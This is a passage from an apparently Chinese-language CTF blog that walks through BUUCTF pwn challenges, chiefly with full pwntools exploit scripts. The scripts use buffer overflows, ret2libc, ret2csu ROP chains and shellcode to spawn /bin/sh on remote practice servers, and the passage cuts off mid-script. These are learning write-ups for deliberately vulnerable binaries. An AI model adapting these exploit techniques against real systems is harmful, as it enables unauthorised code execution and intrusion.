class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__libc_start_main_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main_addr)</span><br><span class="line">libc_base=__libc_start_main_addr-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main_addr)+p32(bin_sh)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1e-ciscn-2019-s-3"><a href="#0x1e-ciscn-2019-s-3" class="headerlink" title="0x1e.ciscn_2019_s_3"></a>0x1e.ciscn_2019_s_3</h2><p><mark>ret2csu</mark></p><p>​    函数表里没有read和write的plt和got，无法进行泄露</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.o1m3686zj40.webp"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">c=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25488</span>)</span><br><span class="line"><span class="comment"># c = process((&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/30&quot;))</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/30&quot;</span>)</span><br><span class="line"></span><br><span class="line">vuln=elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"><span class="comment"># vuln = 0x4004ED</span></span><br><span class="line">mov_rax=<span class="number">0x4004E2</span>  <span class="comment">#rax=59</span></span><br><span class="line">mov_rdx_r13=<span class="number">0x400580</span> <span class="comment"># loc_400580</span></span><br><span class="line">rbp_r12_r13_r14_r15_ret=<span class="number">0x40059b</span> <span class="comment">#libc_csu</span></span><br><span class="line">sys_call=<span class="number">0x400517</span></span><br><span class="line">rdi_ret=<span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span>+p64(vuln)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.recv(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">stack_add=u64(c.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_add))</span><br><span class="line"></span><br><span class="line">bin_sh=stack_add-<span class="number">0x118</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(rdi_ret)+p64(rbp_r12_r13_r14_r15_ret)</span><br><span class="line">payload+=p64(<span class="number">0x1</span>)+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0</span>)+p64(bin_sh)<span class="comment">#r12=bin_sh+0x50 also success</span></span><br><span class="line">payload+=p64(mov_rdx_r13)+p64(mov_rax)+p64(rdi_ret)+p64(bin_sh)+p64(sys_call)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>此exp参考：<a class="link" href="https://blog.csdn.net/Lcw_linyx/article/details/124656798?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167558467816800211519179%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167558467816800211519179&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124656798-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=ciscn_2019_s_3&spm=1018.2226.3001.4187">此处跳转<i class="fas fa-external-link-alt"></i></a></p><p><mark>此题疑惑点</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.1v6l5tyx4w4g.webp"></p><ol><li>我本地调试一直偏移都是<code>0x128</code></li><li>payload第一段的传参为什么是<code>/bin/sh\x00</code>在最前面？</li><li>为什么是<code>bin_sh+0x50</code>/<code>bin_sh+0x08</code>？</li><li>gdb调试技巧</li><li>汇编</li><li>我太菜了:cry:</li></ol><h2 id="0x1f-babyheap-0ctf-2017"><a href="#0x1f-babyheap-0ctf-2017" class="headerlink" title="0x1f.babyheap_0ctf_2017"></a>0x1f.babyheap_0ctf_2017</h2><h2 id="0x20-ez-pz-hackover-2016"><a href="#0x20-ez-pz-hackover-2016" class="headerlink" title="0x20.ez_pz_hackover_2016"></a>0x20.ez_pz_hackover_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29519</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">name_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;name_addr = &quot;</span> + <span class="built_in">hex</span>(name_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;crashme\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">26</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(name_addr - <span class="number">28</span>)</span><br><span class="line">payload += asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考文章：<a class="link" href="https://blog.csdn.net/qq_44768749/article/details/108176719?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167559253416782429769316%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167559253416782429769316&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108176719-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=ez_pz_hackover_2016&spm=1018.2226.3001.4187">点此处跳转<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x21-picoctf-2018-rop-chain"><a href="#0x21-picoctf-2018-rop-chain" class="headerlink" title="0x21.picoctf_2018_rop chain"></a>0x21.picoctf_2018_rop chain</h2><p>​    较为有趣的复习练手题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret2libc3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/33&quot;)</span></span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27524</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/33&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x080488bf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x656d6974</span></span><br><span class="line"><span class="comment"># print(&quot;leak libc_start_main_got addr and return to main again!&quot;)</span></span><br><span class="line"><span class="comment"># payload = flat([b&#x27;a&#x27;*0x22,puts_plt,main,libc_start_main_got])</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span>,puts_plt,main,puts_got])</span><br><span class="line"></span><br><span class="line">c.sendlineafter(<span class="string">b&#x27;Enter your input&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_start_main_addr = u32(c.recv()[0:4])</span></span><br><span class="line">puts_addr = u32(c.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="comment"># log.success(&quot;the leak addr: &quot;+hex(libc_start_main_addr))</span></span><br><span class="line">log.success(<span class="string">&quot;the leak addr: &quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_main_addr)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class="line"><span class="comment"># libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line">libcbase = puts_addr - <span class="number">0x067360</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_addr = libcbase + libc.dump(&quot;system&quot;)</span></span><br><span class="line">system_addr = libcbase +  <span class="number">0x03cd10</span></span><br><span class="line"><span class="comment"># bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x17b8cf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span>,system_addr,<span class="string">b&#x27;aaaa&#x27;</span>,bin_sh])</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP chain</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/33&quot;)</span></span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27524</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/33&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">win1_addr = <span class="number">0x080485CB</span></span><br><span class="line">win2_addr = <span class="number">0x080485D8</span></span><br><span class="line">flag_addr = <span class="number">0x0804862B</span></span><br><span class="line">main_addr = <span class="number">0x0804873B</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Enter your input&gt; &#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span> +  p32(win1_addr) + p32(win2_addr) + p32(main_addr) + p32(<span class="number">0xBAAAAAAD</span>)</span><br><span class="line">c.sendline(payload1)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Enter your input&gt; &#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span> + p32(flag_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">c.sendline(payload2)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>值得注意的是：<img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.3tzix3bk3ytc.webp"></p><p><code>0X18+0X04!=0X22</code></p><h2 id="0x22-jarvisoj-level3-x64"><a href="#0x22-jarvisoj-level3-x64" class="headerlink" title="0x22.jarvisoj_level3_x64"></a>0x22.jarvisoj_level3_x64</h2><p><code>ret2libc3 x64</code></p><p><mark>Good for reviewing ret2libc3 under x64</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.5xka6mwd9tkw.webp"></p><p>但是我发现并没有我想的那么简单，因为没有调用write函数的第三个参数的寄存器<code>rdx</code>，现在考虑一下<code>ret2csu</code>。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.2sjy3jadabgg.webp"></p><p>但是我们可以试一下，成功调用write函数的那个时候的<code>rdi</code>到底是多少，因为其所管控的值只是我们write函数的第三个参数，我们只需要8个字节，就足够了。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.70i44xzz4mps.webp"></p><p>  通过输出结果以及gdb部分调试，我们发现<code>rdx</code>的值远远大于8字节，故可以利用<code>ret2libc3</code></p><p> <mark>存疑，如何使用gdb调试到调用write函数的那一刻的rdx？</mark></p><p>​                —已解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/34&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28415</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/34&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc64.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x04006b3</span></span><br><span class="line">pop_rsi_pop_r15_ret = <span class="number">0x04006b1</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> +  p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(<span class="number">0xdeadbeef</span>) + p64(write_plt) +p64(main_addr)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line">read_addr = u64(c.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment"># 0x7f8317132250</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR:&#x27;</span>+<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc =LibcSearcher(&quot;read&quot;,read_addr)</span></span><br><span class="line"><span class="comment"># libcbase = read_addr - libc.dump(&#x27;read&#x27;)</span></span><br><span class="line"><span class="comment"># system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># bin_sh = libcbase + libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line">libcbase = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.42c4wfpaanls.webp"></p><p>​    用LibcSearcher没有成功，直接用的BUU上提供的资源，很快就解出来了，也熟悉了一下<code>.so</code>文件的使用。</p><p>​    疑问还在我的心里，如何利用<code>ret2csu</code>来解出这道题呢？</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.2y959f4jig1s.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/34&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28439</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/34&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc64.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">csu_behind = <span class="number">0x4006A6</span></span><br><span class="line">csu_front = <span class="number">0x400690</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">r12,r15,r14,r13,ret_addr</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    第1个参数是我们想调用的函数地址</span></span><br><span class="line"><span class="string">    第2个参数是被调用函数的第1个参数</span></span><br><span class="line"><span class="string">    第3个参数是被调用函数的第2个参数</span></span><br><span class="line"><span class="string">    第4个参数是被调用函数的第3个参数</span></span><br><span class="line"><span class="string">    第5个参数是返回地址</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line">    payload += p64(csu_behind)</span><br><span class="line">    payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> <span class="comment">#add rsp, 8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">    payload += p64(r12)</span><br><span class="line">    payload += p64(r13) <span class="comment">#r13</span></span><br><span class="line">    payload += p64(r14) <span class="comment">#r14</span></span><br><span class="line">    payload += p64(r15) <span class="comment">#r15</span></span><br><span class="line">    payload += p64(csu_front)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> <span class="comment"># add *1  + pop * 6 = 8 * 7 = 0x38</span></span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    c.sendline(payload)    </span><br><span class="line">c.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">csu(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,main_addr)</span><br><span class="line"></span><br><span class="line">write_addr=u64(c.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR:&#x27;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libcbase = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">execve_addr = libcbase + libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_addr = elf.got[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu(read_addr,<span class="number">0</span>,bss_addr,<span class="number">16</span>,main_addr)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input:\n&quot;</span>)</span><br><span class="line">c.send(p64(execve_addr)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># write down shellcode</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;BSS ADDR:&quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">csu(bss_addr,bss_addr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">csu(bss_addr,bss_addr+8,0,0,main_addr) </span></span><br><span class="line"><span class="string">如何理解这段代码？🏇</span></span><br><span class="line"><span class="string">bss_addr被调函数地址，bss_addr + 8 是被调函数的第一个参数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">我们把execve_addr和&#x27;/bin/sh\x00&#x27;写入了bss段</span></span><br><span class="line"><span class="string">execve_addr在bss_addr</span></span><br><span class="line"><span class="string">&#x27;/bin/sh\x00&#x27;在bss_addr + 8 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x23-wustctf2020-getshell"><a href="#0x23-wustctf2020-getshell" class="headerlink" title="0x23.wustctf2020_getshell"></a>0x23.wustctf2020_getshell</h2><p><code>easy_ret2text</code></p><h2 id="0x24-jarvisoj-level4"><a href="#0x24-jarvisoj-level4" class="headerlink" title="0x24.jarvisoj_level4"></a>0x24.jarvisoj_level4</h2><p><code>ret2libc3 x86</code></p><h2 id="0x25-bjdctf-2020-babyrop2"><a href="#0x25-bjdctf-2020-babyrop2" class="headerlink" title="0x25.bjdctf_2020_babyrop2"></a>0x25.bjdctf_2020_babyrop2</h2><p><code>canary &amp; ret2libc3 &amp; fmt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 